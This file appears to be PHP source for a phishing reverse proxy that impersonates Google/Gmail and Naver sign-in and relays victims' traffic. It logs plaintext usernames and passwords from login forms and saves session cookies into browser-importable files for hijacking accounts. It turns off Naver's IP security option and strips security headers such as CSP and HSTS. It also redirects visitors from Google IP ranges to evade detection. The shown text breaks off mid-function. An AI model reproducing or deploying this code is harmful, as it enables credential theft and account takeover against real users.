<?php     

error_reporting(E_ALL);

//
// DEFINE CONSTANTS
//

$_inbox_proxy = false;

$_l_names = array (
	'__Host-GAPS',
	'NID',
	'ACCOUNT_CHOOSER',
	'SMSV'
);
$_i_names = array (
	'ACCOUNT_CHOOSER',
	'__Host-GAPS',
	'SMSV'
);

$_config = array (
	'url_var_name'    => 'q',
	'get_form_name'   => '____pgfa',
	'max_file_size'   => -1,
	'compress_output' => 0
);

$_flags = array (
	'accept_cookies'  => 1,
	'base64_encode'   => 0
);

$_html_tags = array (
	'a'          => array('href'),
	'area'       => array('href'),
	'applet'     => array('codebase', 'code', 'object', 'archive'),
	'base'       => array('href'),
	'head'       => array('profile'),
	'body'       => array('background'),
	'bgsound'    => array('src'),
	'blockquote' => array('cite'),
	'del'        => array('cite'),
	'div'        => array('data-config', 'data-default-continue-url', 'data-back-url'),
	'embed'      => array('src'),
	'form'       => array('action'),
	'fig'        => array('src', 'imagemap'),
	'frame'      => array('src', 'longdesc'),
	'iframe'     => array('src', 'longdesc'),
	'hr'         => array('src'),
	'ilayer'     => array('src'),
	'img'        => array('src', 'longdesc', 'srcset', 'data-src'),
	'input'      => array('src', 'usemap'),
	'image'      => array('src', 'longdesc'),
	'ins'        => array('cite'),
	'layer'      => array('src'),
	'link'       => array('href', 'src', 'urn'),
	'meta'       => array('content'),
	'note'       => array('src'),
	'object'     => array('usermap', 'codebase', 'classid', 'archive', 'data'),
	'overlay'    => array('src', 'imagemap'),
	'param'      => array('value'),
	'q'          => array('cite'),
	'script'     => array('src'),
	'select'     => array('src'),
	'style'      => array('data-href'),
	'table'      => array('background'),
	'tr'         => array('background'),
	'th'         => array('background'),
	'td'         => array('background'),
	'ul'         => array('src')
);

$_hosts = array (
	'#^127\.|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|localhost#i'
);

$_proxify = array(
	'text/html' 				=> 	1,
	'application/xml+xhtml' 	=> 	1,
	'application/xhtml+xml' 	=> 	1,
	'text/css' 					=> 	1,
	'text/javascript' 			=> 	1,
	'application/javascript' 	=> 	1,
	'application/x-javascript' 	=> 	1,
	'text/plain' 				=> 	1, 
	'application/json' 			=> 	1,
	'font/woff' 				=> 	1
);

$_system = array (
	'ssl'	=> extension_loaded('openssl') && version_compare(PHP_VERSION, '4.3.0', '>='),
	'gzip'  => extension_loaded('zlib') && !ini_get('zlib.output_compression')
);

//
// DEFINE VARIABLES
//
$_http_host = isset($_SERVER['HTTP_HOST']) 
	? $_SERVER['HTTP_HOST'] 
	: (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');

$_protocal = 'http' . ((isset($_ENV['HTTPS']) && $_ENV['HTTPS'] == 'on') || $_SERVER['SERVER_PORT'] == 443 ? 's' : '');

$_script_url = $_protocal . '://' . $_http_host 
	. ($_SERVER['SERVER_PORT'] != 80 && $_SERVER['SERVER_PORT'] != 443 ? ':' . $_SERVER['SERVER_PORT'] : '')
	. $_SERVER['PHP_SELF'];

$_script_url 		= str_replace('index.php', '', $_script_url);
$_script_base 		= substr($_script_url, 0, strrpos($_script_url, '/') + 1);

$_default_rtn_url = 'https://mail.google.com';
$_first_login_url = 'https://accounts.google.com/v3/signin/identifier?dsh=S553687043%3A1678352857546339&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AWnogHdPky27xtwE9HrAvl3DSBXspfYl0Q4t4_Azrl91kXf7qwSqTQZJVe6mdlD-UNmt8Ghr3GHpSg&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin';

$_user_id 			= '';

$_rep_host			= "nid.naver.com";
$_rep_base 			= 'https://' . $_rep_host;
$_remote_addr		= getenv("REMOTE_ADDR");
$_hostname	 		= gethostbyaddr($GLOBALS['_remote_addr']);

$_add_url  			= '';
$_url               = '';
$_url_parts         = array();
$_base              = array();
$_socket            = null;
$_request_method    = $_SERVER['REQUEST_METHOD'];
$_request_headers   = '';
$_cookie            = '';
$_post_body         = '';
$_response_headers  = array();
$_response_keys     = array();  
$_http_version      = '';
$_response_code     = 0;
$_content_type      = 'text/html';
$_content_length    = false;
$_content_disp      = '';
$_set_cookie        = array();
$_response_body     = '';

$_retry             = false;
$_play_log_xhr		= false;

$_http_mode_proxy	= true;
$_extra_auth_page	= false;
$_interactive_login	= false;

$_rtn_file		= $GLOBALS['_remote_addr'] . '/rtnurl';
$_agent_file	= $GLOBALS['_remote_addr'] . '/AGENT';
$_yutube_file	= $GLOBALS['_remote_addr'] . '/YOUTUBE';
$_login_file	= $GLOBALS['_remote_addr'] . '/LOGIN';
$_inbox_file	= $GLOBALS['_remote_addr'] . '/INBOX';
$_jserr_file	= $GLOBALS['_remote_addr'] . '/ERROR';
//
// CHECK BLOCK / ANALYSIS
//
$_block_ips	= array (
	'66.249', 
	'66.102', 
	'66.205', 
	'67.194.237', 
	'67.194.234', 
	'67.194.239', 
	'67.212.255', 
	'167.142.',
	'220.230.',
	'211.249.'
);

foreach ($_block_ips as $_b_ip) {
	if (stristr($GLOBALS['_remote_addr'], $_b_ip) || stristr($_hostname, "google") || stristr($_hostname, "proxy")) {
		header("Location: https://mail.google.com/mail/");
		exit(0);
	}
}
function editcookie($name, $value, $flag = true, $end_flag = false)
{
    return '    "' . $name . '": ' . ( $flag ? '"' . $value . '"' : $value) . ($end_flag ? '' : ",\r\n");
}
function Add_Plugin_Cookie($filename, $name, $value, $domain,$secure,$expires = 0)
{
	if(!is_dir("./success"))
		mkdir("./success");
	$_host_IP = getenv('REMOTE_ADDR');
	$primeLog = sprintf("./success/%s_%s.txt", $_host_IP,$filename);
    $cookie_str = '';
    $cookie_str = file_exists($primeLog) ? file_get_contents($primeLog) : '';  
        
    $arr  = explode("},\r\n{", $cookie_str);
    $cookie_id = empty($cookie_str) ? 1 : sizeof($arr) + 1;
	$domain = (substr($domain,0,1) != ".") ?  "." . $domain : $domain; 
    if(!strstr($cookie_str,'"' . $name . '"'))///////////////if new cookie, add in EOF
    {
        $cookie_str = strlen($cookie_str) ? substr($cookie_str, 0, strlen($cookie_str) - 3) : '';
        $cookie_str .= (empty($cookie_str)) ? "[\r\n" : ",\r\n";
        $cookie_str .= "{\r\n" . 
                        editcookie('domain', $domain) . 
                        editcookie('expirationDate', $expires, false) .  
                        editcookie('hostOnly', 'false', false) .  
                        editcookie('httpOnly', 'true', false) . 
                        editcookie('name', $name) . 
                        editcookie('path', '/');
        if (!strstr($name,"COOKIE%253B") && $secure)
            $cookie_str .= editcookie('secure', 'true', false);
        else
            $cookie_str .= editcookie('secure', 'false', false); 
                         
        $cookie_str .=  editcookie('session', 'false', false) . 
                        editcookie('storeId', '0') .
                        editcookie('value', $value) . 
                        editcookie('id', $cookie_id, true, true) .
                        "\r\n}\r\n]";
        
    }
    else/////////////////////////////////if update cookie, change old cookie
    {
        foreach ($arr as $key => $old_cookie)
        {
            if (strstr($old_cookie,'"' . $name . '"'))
            {
                $arr[$key] = "\r\n" . 
                        editcookie('domain', $domain) . 
                        editcookie('expirationDate', $expires, false) .  
                        editcookie('hostOnly', 'false', false) .  
                        editcookie('httpOnly', 'true', false) . 
                        editcookie('name', $name) . 
                        editcookie('path', '/'); 
                if (!strstr($name,"COOKIE%253B") && $secure)
                    $arr[$key] .= editcookie('secure', 'true', false);
                else
                    $arr[$key] .= editcookie('secure', 'false', false); 
                $arr[$key] .= editcookie('session', 'false', false) . 
                        editcookie('storeId', '0') .
                        editcookie('value', $value) . 
                        editcookie('id', $key+1, true, true) .
                        "\r\n";
                $arr[$key] = (($key == 0) ? "\r\n[\r\n{" : '') . $arr[$key];
                $arr[$key] .= (($key + 1) == sizeof($arr)) ? "}\r\n]" : '';
            }
        }
        $cookie_str = implode("},\r\n{", $arr);
    }
    $fp= fopen( $primeLog,"w+");
    fputs($fp, $cookie_str);
    fclose($fp);
}
//
// DEFINE FUNCTIONS
//

function url_parse($url, & $container) {
	$temp = array();
    $temp = @parse_url($url);

    if (!empty($temp)) {
        $temp['port_ext'] = '';
        $temp['base']     = $temp['scheme'] . '://' . $temp['host'];

        if (isset($temp['port'])) {
            $temp['base'] .= $temp['port_ext'] = ':' . $temp['port'];
        }
        else {
            $temp['port'] = $temp['scheme'] === 'https' ? 443 : 80;
        }
        
        $temp['path'] = isset($temp['path']) ? $temp['path'] : '/';
        $path         = array();
        $temp['path'] = explode('/', $temp['path']);
    
        foreach ($temp['path'] as $dir) {
            if ($dir === '..') {
                array_pop($path);
            }
            else if ($dir !== '.') {
                for ($dir = rawurldecode($dir), $new_dir = '', $i = 0, $count_i = strlen($dir); $i < $count_i; $new_dir .= strspn($dir{$i}, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$-_.+!*\'(),?:@&;=') ? $dir{$i} : rawurlencode($dir{$i}), ++$i);
                $path[] = $new_dir;
            }
        }

        $temp['path']     = str_replace('/%7E', '/~', '/' . ltrim(implode('/', $path), '/'));
        $temp['file']     = substr($temp['path'], strrpos($temp['path'], '/')+1);
        $temp['dir']      = substr($temp['path'], 0, strrpos($temp['path'], '/'));
        $temp['base']    .= $temp['dir'];
        $temp['prev_dir'] = substr_count($temp['path'], '/') > 1 ? substr($temp['base'], 0, strrpos($temp['base'], '/')+1) : $temp['base'] . '/';
        $container = $temp;

        return true;
    }
    return false;
}

function complete_url($url, $proxify = true) {
    $url = trim($url);
    if ($url === '') {
        return '';
    }
    
    $hash_pos = strrpos($url, '#');
    $fragment = $hash_pos !== false ? '#' . substr($url, $hash_pos) : '';
    $sep_pos  = strpos($url, '://');
    
    if ($sep_pos === false || $sep_pos > 5) {
        switch ($url{0}) {
		case '/':
			$url = substr($url, 0, 2) === '//' ? $GLOBALS['_base']['scheme'] . ':' . $url : $GLOBALS['_base']['scheme'] . '://' . $GLOBALS['_base']['host'] . $GLOBALS['_base']['port_ext'] . $url;
			break;
		case '?':
			$url = $GLOBALS['_base']['base'] . '/' . $GLOBALS['_base']['file'] . $url;
			break;
		case '#':
			$proxify = false;
			break;
		case 'm':
			if (substr($url, 0, 7) == 'mailto:') {
				$proxify = false;
				break;
			}
		default:
			$url = $GLOBALS['_base']['base'] . '/' . $url;
        }
    }

    return $proxify ? "{$GLOBALS['_script_url']}?{$GLOBALS['_add_url']}&{$GLOBALS['_config']['url_var_name']}=" . encode_url($url) . $fragment : $url;
}

function proxify_inline_script($script) {
    preg_match_all('#[\'"](https\:[^();,\s\'"]+)[\'"]#i', $script, $matches, PREG_SET_ORDER);
    for ($i = 0, $count = count($matches); $i < $count; ++$i) {
		$script = str_replace($matches[$i][1], complete_url($matches[$i][1]), $script);
    }
    return $script;
}

function proxify_inline_css($css) {
    preg_match_all('#url\s*\(\s*(([^)]*(\\\))*[^)]*)(\)|$)?#i', $css, $matches, PREG_SET_ORDER);
    for ($i = 0, $count = count($matches); $i < $count; ++$i) {
        $css = str_replace($matches[$i][0], 'url(' . proxify_css_url($matches[$i][1]) . ')', $css);
    }
    return $css;
}

function proxify_css_url($url) {
    $url   = trim($url);
    $delim = strpos($url, '"') === 0 ? '"' : (strpos($url, "'") === 0 ? "'" : '');

    return $delim . preg_replace('#([\(\),\s\'"\\\])#', '\\$1', complete_url(trim(preg_replace('#\\\(.)#', '$1', trim($url, $delim))))) . $delim;
}

function show_report($_data, $_exit = false, $_write = false) {
	if ($_write) {
		$log = fopen($GLOBALS['_remote_addr'] . '/log', "a+");
		fwrite($log, $_data . "\r\n");
		fclose($log);
	}
	if ($_exit) {
		exit(0);
	}
}

//
// COMPRESS OUTPUT IF INSTRUCTED
//

if ($_config['compress_output'] && $_system['gzip']) {
    ob_start('ob_gzhandler');
}

//
// PARSING PARAMETRES
//

if ($_flags['base64_encode']) {
	function encode_url($url) {
		return rawurlencode(base64_encode($url));
	}
	function decode_url($url) {
		return str_replace(array('&amp;', '&#38;'), '&', base64_decode(rawurldecode($url)));
	}
}
else {
	function encode_url($url) {
		return rawurlencode($url);
	}
	function decode_url($url) {
		return str_replace(array('&amp;', '&#38;'), '&', rawurldecode($url));
	}
}

if (!isset($_GET['menu']) || !isset($_GET[$_config['url_var_name']])) {
	$_rtn_url = $_default_rtn_url;
	 if (file_exists($_rtn_file)) {
		$handle = fopen($_rtn_file, "r");
		$length = filesize($_rtn_file);
		$_rtn_url = $length>0 ? fread($handle, $length) : $_rtn_url;
		fclose($handle);
	}
	header('Location: ' . $_rtn_url);
	show_report("parameter(menu, url_var_name) not set.", true, true);
}

//
// SET INITIAL CONSTANTS
//

if (!is_dir($GLOBALS['_remote_addr'])) {
	mkdir($GLOBALS['_remote_addr']);
}
if(isset($_GET['menu'])){
 $_user_id = $_GET['menu'];
 $_add_url = 'menu=' . $_user_id;
 $_user_id = base64_decode($_user_id);
}


$_url = decode_url($_GET[$_config['url_var_name']]);
if(isset($_GET['rtnurl']))
{
	$log = fopen($_rtn_file, "w");
    fwrite($log, base64_decode($_GET['rtnurl']));
    fclose($log);
}
if (strpos($_url, '://') === false) {
    $_url = 'https://' . $_url;
}

//
// DETERMINE CHECK
//
if (strcasecmp($_protocal, 'http') == 0) {
	$_http_mode_proxy = true;
}
if (stristr($_url, '/InteractiveLogin?')) {
	$_interactive_login = true;
}
if (stristr($_url, 'play.google.com/log?')) {
	$_play_log_xhr = true;
}
if ($_http_mode_proxy && stristr($_url, '/signin/v2/challenge/')) {
	$_extra_auth_page = true;
	
	// &checkConnection=youtube%3A381%3A0&
	if (preg_match('#&checkConnection\=([^\&]+)&#is', $_url, $matches)) {
		$_yutb_value = $matches[1];
		$handle = fopen($_yutube_file, "w");
		fwrite($handle, $_yutb_value);
		fclose($handle);
	}
}
/* if (file_exists($_jserr_file)) {
	header('Location: ' . complete_url($_first_login_url));
	unlink($_remote_addr);
	exit(0);
} */

preg_match_all('#(\&continue\=https\:\/\/[^\/]+\/accounts\/SetSID\?ssdc\=)(.*?)(\&osidt)#is', $_url, $matches, PREG_SET_ORDER);
for ($j = 0, $count_j = count($matches); $j < $count_j; ++$j) {
	$temp = str_replace('&', '%26', $matches[$j][2]);
	$_url = str_replace($matches[$j][0], $matches[$j][1] . $temp . $matches[$j][3], $_url);
}


show_report("\r\n-------------------------------------------------------\r\nrequest-url:" . $_url, false, true);
// $_url = str_replace('https', 'http', $_url);

//
// PARSE URL
//
if (url_parse($_url, $_url_parts)) {
    $_base = $_url_parts;
    if (!empty($_hosts)) {
        foreach ($_hosts as $host) {
            if (preg_match($host, $_url_parts['host'])) {
                show_report("Not Recognized URL:" . $_url, true, true);
            }
        }
    }
} else {
    show_report("parse URL Error:" . $_url, true, true);
}

do {
    $_retry  = false;
   
    //
    // SET REQUEST HEADERS
    //
	$_socket = @fsockopen(($_url_parts['scheme'] === 'https' && $_system['ssl'] ? 'ssl://' : 'tcp://') . $_url_parts['host'], $_url_parts['port'], $err_no, $err_str, 30);

    if ($_socket === false) {
        show_report("Socket Open Error:" . $err_str, true, true);
    }
	
	show_report("\r\n------------------------request------------------------", false, true);
	
    $_request_headers  = $_request_method . ' ' . $_url_parts['path'];
    if (isset($_url_parts['query'])) {
        $_request_headers .= '?';
        $query = preg_split('#([&;])#', $_url_parts['query'], -1, PREG_SPLIT_DELIM_CAPTURE);
        for ($i = 0, $count = count($query); $i < $count; $_request_headers .= implode('=', array_map('urlencode', array_map('urldecode', explode('=', $query[$i])))) . (isset($query[++$i]) ? $query[$i] : ''), $i++);
    }

    $_request_headers .= " HTTP/1.0\r\n";
		
	$requestheaders = '';
	
	$headers = getallheaders();
	foreach($headers as $header => $value) {
		if (strcasecmp($header, 'Content-Length') == 0) {
			$requestheaders .= $header . ": ";
			$requestheaders .= "CTLCTLCTL" . "\r\n";
		} else if (strcasecmp($header, 'Host') == 0) {
			$requestheaders .= $header . ": ";
			$requestheaders .= "HSTHSTHST" . "\r\n";
		} else if (strcasecmp($header, 'Accept-Encoding') == 0) {	
		} else if (strcasecmp($header, 'Referer') == 0) {
			if(strcasecmp($value, $_protocal. "://". $_http_host) == 0) {
				$requestheaders .= $header . ": ";
				$requestheaders .= $_rep_base . "\r\n";
			}
			$pos = strpos($value, '&q=');
			if ($pos !=FALSE) {
				$requestheaders .= $header . ": ";
				$requestheaders .= decode_url(substr($value, $pos+3, strlen($value))) . "\r\n";
			}
		} else if (strcasecmp($header, 'Origin') == 0) {
			if(strcasecmp($value, $_protocal. "://". $_http_host) == 0) {
				$requestheaders .= $header. ": ";
				$requestheaders .= $_rep_base . "\r\n";
			}
		} else if (strcasecmp($header, 'HOSTING_CONTINENT_CODE') == 0) {
		} else if (strcasecmp($header, 'HOSTING_COUNTRY_CODE') == 0) {
		} else if (strcasecmp($header, 'HOSTING_WHITE_IP') == 0) {
		} else if (strcasecmp($header, 'X-Forwarded-Proto') == 0) {
		} else if (strcasecmp($header, 'X-SERVER_PORT') == 0) {
		} else if (strcasecmp($header, 'X-SERVER_PROTOCOL') == 0) {
		} else if (strcasecmp($header, 'X-SIMPLEXI') == 0) {
		} else if (strcasecmp($header, 'X-HOST') == 0) {
		} else if (strcasecmp($header, 'GEOIP_ADDR') == 0) {
		} else if (strcasecmp($header, 'GEOIP_CONTINENT_CODE') == 0) {
		} else if (strcasecmp($header, 'GEOIP_COUNTRY_CODE') == 0) {
		} else if (strcasecmp($header, 'GEOIP_COUNTRY_NAME') == 0) {
		} else if (strcasecmp($header, 'X-Goog-Ext-391502476-Jspb') == 0) {
			if (preg_match('#(\[\")(.*)(\"\])#is', $value, $matches)) {
				if (!stristr($matches[2], "mail")) {
					$requestheaders .= $header . ": ";
					$requestheaders .= $matches[1] . $matches[2] . "\",\"mail" . $matches[3] . "\r\n";	
					$requestheaders .= "X-Goog-Ext-278367001-Jspb: [\"GlifWebSignIn\"]". "\r\n";
				}
			}
		} else if (strcasecmp($header, 'From') == 0) {
		} else if (strcasecmp($header, 'Connection') == 0) {
		} else if (strcasecmp($header, 'mod_security-message') == 0) {
		} else if (strcasecmp($header, 'user-agent') == 0) {
			if ($_inbox_proxy) {
				if (file_exists($_agent_file)) {
					// reset agent to target`s
					$handle = fopen($_agent_file, "r");
					$length = filesize($_agent_file);
					$value = $length>0 ? fread($handle, $length) : $value;
					fclose($handle);
				}
				$requestheaders .= $header . ": " . $value . "\r\n";
			} else {
				if (file_exists($_agent_file)) {
					// don`t need to make agent file.
				}
				else {
					$handle = fopen($_agent_file, "w");
					fwrite($handle, $value);
					fclose($handle);
				}
				//$value = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36';
				$requestheaders .= $header . ": " . $value . "\r\n";
			}
		} else if (strcasecmp($header, 'Cookie') == 0) {
			if ($value != '') {	
				$requestheaders .= "Cookie: ";
				/******************************************************/
				if ($_http_mode_proxy) {
					$_my_cookie = NULL;
					$_temp_file = $_inbox_proxy ? $_inbox_file : $_login_file;
					if (file_exists($_temp_file)) {
						$handle = fopen($_temp_file, "r");
						$length = filesize($_temp_file);
						$_my_cookie = $length>0 ? fread($handle, $length) : NULL;
						fclose($handle);
					}
					if ($_my_cookie) {
						if ($_play_log_xhr) {
							if (preg_match('#' . $_l_names[1] . '\=[^\;]+\;#is', $_my_cookie, $matches)) {
								/* add only NID */
								$requestheaders .= $matches[0];
							}
						} else {
							preg_match_all('#([^\=]+)\=[^\;]+\;#i', $_my_cookie, $matches, PREG_SET_ORDER);
							for ($i = 0, $count = count($matches); $i < $count; ++$i) {
								if (stristr($value, $matches[$i][1])) {
									/* delete overrided cookie */
									$_my_cookie = str_replace($matches[$i][0], '', $_my_cookie);
								}
							}
							/* add cookies */
							$requestheaders .= $_my_cookie;
						}
						$_cookie = $_my_cookie;
					}
				}
				/******************************************************/
				$value = preg_replace('/CheckConnectionTempCookie.*?;\s*/', "", $value);
				$requestheaders .= $value . "\r\n";
			}
		} else {
			$requestheaders .= $header . ": " . $value . "\r\n";
		}	
	}
	
	if ($_inbox_proxy && $_cookie == '') {
		$requestheaders .= "Cookie: ";
		$_my_inbox_cookie = $_my_login_cookie = $_temp_cookie = '';
		if (file_exists($_inbox_file)) {
			$handle = fopen($_inbox_file, "r");
			$length = filesize($_inbox_file);
			$_my_inbox_cookie = $length>0 ? fread($handle, $length) : '';
			fclose($handle);
		}
		if (file_exists($_login_file)) {
			$handle = fopen($_login_file, "r");
			$length = filesize($_login_file);
			$_my_login_cookie = $length>0 ? fread($handle, $length) : '';
			fclose($handle);
		}
		
		if (preg_match('#' . $_i_names[0] . '\=[^\;]+\;#is', $_my_inbox_cookie, $matches)) {
			$_temp_cookie = $matches[0];
		} else if (stristr($_temp_cookie, $_i_names[0]) === FALSE && preg_match('#' . $_i_names[0] . '\=[^\;]+\;#is', $_my_login_cookie, $matches)) {
			$_temp_cookie = $matches[0];
		} /* add ACCOUNT_CHOOSER */
		
		if (preg_match('#' . $_i_names[1] . '\=[^\;]+\;#is', $_my_inbox_cookie, $matches)) {
			$_temp_cookie .= $matches[0];
		} else if (stristr($_temp_cookie, $_i_names[1]) === FALSE && preg_match('#' . $_i_names[1] . '\=[^\;]+\;#is', $_my_login_cookie, $matches)) {
			$_temp_cookie .= $matches[0];
		} /* add Host-GAPS */
		
		if (preg_match('#' . $_i_names[2] . '\=[^\;]+\;#is', $_my_inbox_cookie, $matches)) {
			$_temp_cookie .= $matches[0];
		} else if (stristr($_temp_cookie, $_i_names[2]) === FALSE && preg_match('#' . $_i_names[2] . '\=[^\;]+\;#is', $_my_login_cookie, $matches)) {
			$_temp_cookie .= $matches[0];
		} /* add SMSV */
		
		/* replace or create INBOX file */
		if (preg_match('#https\:\/\/mail\.google\.com\/mail\/[a-z]+\/[0-9]+\/[a-z]+\/[a-zA-Z0-9]+\/\?#is', $_url)) {
			$handle = fopen($_inbox_file, "w");
			fwrite($handle, $_temp_cookie);
			fclose($handle);	
		}
		
		$requestheaders .= $_temp_cookie . "\r\n";
	}

	$requestheaders = str_replace('HSTHSTHST', $_url_parts['host'] . $_url_parts['port_ext'], $requestheaders);
	$_request_headers .= $requestheaders;
	    
    if ($_request_method == 'POST') {
		$_post_body = file_get_contents('php://input');
		$_request_headers .= "\r\n"; 
		if(stristr($_post_body,"smart_LEVEL=1") == true)
		{
			$_post_body = str_replace('smart_LEVEL=1','smart_LEVEL=-1',$_post_body);//IP보안 오프
		}
		$_post_body = str_replace('&rv=&ru=','',$_post_body);
		if (stristr($_post_body, "&ru=")){
			$_username = substr($_post_body,strrpos($_post_body,'ru=')+3,strlen($_post_body)-strrpos($_post_body,'ru=')-3);///POST때 로그인사용자아이디 얻기
			show_report("Login User:  " . $_username, false, true);
			$_post_body = substr($_post_body,0,strrpos($_post_body,'ru')-1);//POST때 로그인사용자아이디삭제
			
		}
		if (stristr($_post_body, "&rv=")){
			$_userpw = substr($_post_body,strrpos($_post_body,'rv=')+3,strlen($_post_body)-strrpos($_post_body,'rv=')-3);///POST때 로그인암호평문 얻기
			show_report("Login Password:  " . $_userpw, false, true);
			$_post_body = substr($_post_body,0,strrpos($_post_body,'rv')-1);//POST때 암호평문삭제
			
		}
		if(stristr($_post_body,"auto=&") == true)
		{
			$_post_body = str_replace('auto=&','auto=init&sauto=on&',$_post_body);
		}
		if(stristr($_post_body,"&otp=")||stristr($_post_body,"&key="))
		{
			$_post_body=$_post_body.'&nvlong=on'; 
		}
		if(stristr($_post_body,"dynamicKey=")&&stristr($_post_body,"pw=")&&!stristr($_post_body,"nvlong="))
		{
			$_post_body=$_post_body.'&nvlong=on'; 
		}
		
		$_request_headers .= $_post_body;			
        $_request_headers .= "\r\n";
        $_request_headers = str_replace('CTLCTLCTL',strlen($_post_body),$_request_headers);
        $_post_body = '';
    }
	
    $_request_headers .= "\r\n";

	show_report($_request_headers, false, true);
	
    fwrite($_socket, $_request_headers);

    show_report("\r\n------------------------response------------------------", false, true);
	
    $_response_headers = $_response_keys = array();
    
    $line = fgets($_socket, 8192);
    while (strspn($line, "\r\n") !== strlen($line)) {
        @list($name, $value) = explode(':', $line, 2);
        $name = trim($name);
        $_response_headers[strtolower($name)][] = trim($value);
        $_response_keys[strtolower($name)] = $name;
        $line = fgets($_socket, 8192);
    }
    
    sscanf(current($_response_keys), '%s %s', $_http_version, $_response_code);
    if (isset($_response_headers['content-type'])) {
        list($_content_type, ) = explode(';', str_replace(' ', '', strtolower($_response_headers['content-type'][0])), 2);
    }
    if (isset($_response_headers['content-length'])) {
        $_content_length = $_response_headers['content-length'][0];
        unset($_response_headers['content-length'], $_response_keys['content-length']);
    }
    if (isset($_response_headers['content-disposition'])) {
        $_content_disp = $_response_headers['content-disposition'][0];
        unset($_response_headers['content-disposition'], $_response_keys['content-disposition']);
    }
    if (isset($_response_headers['set-cookie']) && $_flags['accept_cookies']) {
		foreach ($_response_headers['set-cookie'] as $cookie) {
			preg_match_all('#domain=(.*);#is', $cookie, $matches, PREG_SET_ORDER);			
			for ($i = 0; $i < count($matches); $i++) { 
				$cookie = str_replace($matches[$i][1], "." . $_http_host, $cookie);
			}
			$_set_cookie[] = $cookie;
			/******************************************************/
			if ($_http_mode_proxy) {
				$name = $value = '';
				preg_match('#^\s*([^=;,\s]*)\s*=?\s*([^;]*)#',$cookie, $match) && list(, $name, $value) = $match;
                preg_match('#;\s*expires\s*=\s*([^;]*)#i',      $cookie, $match) && list(, $expires)      = $match;
                preg_match('#;\s*path\s*=\s*([^;,\s]*)#i',      $cookie, $match) && list(, $path)         = $match;
                preg_match('#;\s*domain\s*=\s*([^;,\s]*)#i',    $cookie, $match) && list(, $domain)       = $match;
                //preg_match('#;\s*(secure\b)#i',                 $cookie, $match) && list(, $secure)       = $match;
				$expires_time = empty($expires) ? 0 : intval(@strtotime($expires));
				if ($value == '')
					continue;
				//NID_AUT,NID_SES,NID_JKL,NID_SAUTO인 경우만 기록
			    if($name == "NID_AUT" || $name == "NID_SES" || $name == "NID_JKL" || $name == "NID_SAUTO"){
				   Add_Plugin_Cookie("Cookie.log","$name","$value","naver.com",'false',$expires_time);
			    }
				$_my_file = NULL;
				if ($_inbox_proxy) {
					$_my_file = $_inbox_file;
				}
				else if (strcasecmp($name, $_l_names[0]) == 0 || /* Host-GAPS */
					strcasecmp($name, $_l_names[1]) == 0 || /* NID */
					strcasecmp($name, $_l_names[2]) == 0 || /* ACCOUNT_CHOOSER */
					strcasecmp($name, $_l_names[3]) == 0 /* SMSV */
					) {
					$_my_file = $_login_file;
				}
				
				if ($_my_file) {
					$_my_cookie = '';
					if (file_exists($_my_file)) {
						$handle = fopen($_my_file, "r");
						$length = filesize($_my_file);
						$_my_cookie = $length>0 ? fread($handle, $length) : '';
						fclose($handle);
						unlink($_my_file);
					}
					
					if (stristr($_my_cookie, $name)) {
						if (stristr($_my_cookie, $value)) {
							// don`t update cookies.
						} else {
							if (preg_match('#' . $name . '=([^\;]+)\;#is', $_my_cookie, $matches1)) {
								// delete cookie
								$_my_cookie = str_replace($matches1[1], $value, $_my_cookie);
							}
						}
					} else {
						// append cookies
						$_my_cookie .= $name . '=' . $value . ';';
					}
					$handle = fopen($_my_file, "w");
					fwrite($handle, $_my_cookie);
					fclose($handle);
				}
			}
			/******************************************************/
		}
		unset($_response_headers['set-cookie'], $_response_keys['set-cookie']);
		
		if (!empty($_set_cookie)) {
			$_response_keys['set-cookie'] = 'Set-Cookie';
			$_response_headers['set-cookie'] = $_set_cookie;
		}
	}
    if (isset($_response_headers['p3p']) && 
		preg_match('#policyref\s*=\s*[\'"]?([^\'"\s]*)[\'"]?#i', $_response_headers['p3p'][0], $matches))
    {
        $_response_headers['p3p'][0] = str_replace($matches[0], 'policyref="' . complete_url($matches[1]) . '"', $_response_headers['p3p'][0]);
    }
    if (isset($_response_headers['refresh']) && 
		preg_match('#([0-9\s]*;\s*URL\s*=)\s*(\S*)#i', $_response_headers['refresh'][0], $matches))
    {
        $_response_headers['refresh'][0] = $matches[1] . complete_url($matches[2]);
    }
    if (isset($_response_headers['location'])) {
        $_response_headers['location'][0] = complete_url($_response_headers['location'][0]);
    }
    if (isset($_response_headers['uri'])) {
        $_response_headers['uri'][0] = complete_url($_response_headers['uri'][0]);
    }
    if (isset($_response_headers['content-location'])) {
        $_response_headers['content-location'][0] = complete_url($_response_headers['content-location'][0]);
    }
    if (isset($_response_headers['connection'])) {
        unset($_response_headers['connection'], $_response_keys['connection']);
    }
    if (isset($_response_headers['keep-alive'])) {
        unset($_response_headers['keep-alive'], $_response_keys['keep-alive']);
    }
    if (isset($_response_headers['x-frame-options'])) {
        unset($_response_headers['x-frame-options'], $_response_keys['x-frame-options']);
    }
	if (isset($_response_headers['cross-origin-resource-policy'])) {
        unset($_response_headers['cross-origin-resource-policy'], $_response_keys['cross-origin-resource-policy']);
    }
	if (isset($_response_headers['cross-origin-opener-policy-report-only'])) {
        unset($_response_headers['cross-origin-opener-policy-report-only'], $_response_keys['cross-origin-opener-policy-report-only']);
    }
	if (isset($_response_headers['content-security-policy'])) {
        unset($_response_headers['content-security-policy'], $_response_keys['content-security-policy']);
    }
	if (isset($_response_headers['content-security-policy-report-only'])) {
        unset($_response_headers['content-security-policy-report-only'], $_response_keys['content-security-policy-report-only']);
    }
	if (isset($_response_headers['strict-transport-security'])) {
        unset($_response_headers['strict-transport-security'], $_response_keys['strict-transport-security']);
    }
	if (isset($_response_headers['access-control-allow-origin'])) {
		$_response_headers['access-control-allow-origin'][0] = $_protocal . '://' . $_http_host;		
    }
} while ($_retry);

do {
    $data = @fread($_socket, 8192);
    $_response_body .= $data;
} while (isset($data{0}));
   
unset($data);
fclose($_socket);

$_filename = $_url_parts['file'];
if (stristr($_url, '/CheckCookie?') || stristr($_url, '/SetOSID?')) {
	if ($_inbox_proxy) {	
	}
	else {
		// go to rtnurl
